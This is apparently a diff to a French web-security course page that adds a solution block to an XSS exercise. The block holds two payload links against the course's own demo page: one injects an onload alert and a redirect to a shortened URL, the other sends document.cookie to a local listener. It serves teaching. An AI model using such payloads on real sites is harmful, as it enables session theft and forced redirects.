@@ -57,6 +57,16 @@ Ce lien est source **d'un très grand danger**, je vous propose de réfléchir �
 
 C'est à vous (enfin à nous).
 
+::: details Solution
+
+- [Exemple de solution (injection via lien)](https://cours.brosseau.ovh/demo/xss/index.html?uri=https://fakeimg.pl/300/%22%20onload=%22alert(%27Coucou%27);%20window.location=%27<https://bit.ly/3Bpiela%27%22>)
+
+- [Exemple de vol de cookie](https://cours.brosseau.ovh/demo/xss/index.html?uri=https://fakeimg.pl/300/%22%20onload=%22document.body.insertAdjacentHTML(%27beforeend%27,%20`%3Clink%20rel=%27stylesheet%27%20href=%27<http://localhost:8888/?v=${document.cookie}%27%20/%3E>`)%22)
+
+Étudier le code JavaScript et le code HTML généré, pourquoi ça ne fonctionne pas ?
+
+:::
+
 ## Partie 2.1 : Les XSS
 
 Pour mieux comprendre l'aspect dangereux d'une XSS nous allons utiliser Hack Splaining, pour ça rendez-vous sur [Hack Splaining](https://www.hacksplaining.com/exercises/xss-stored)
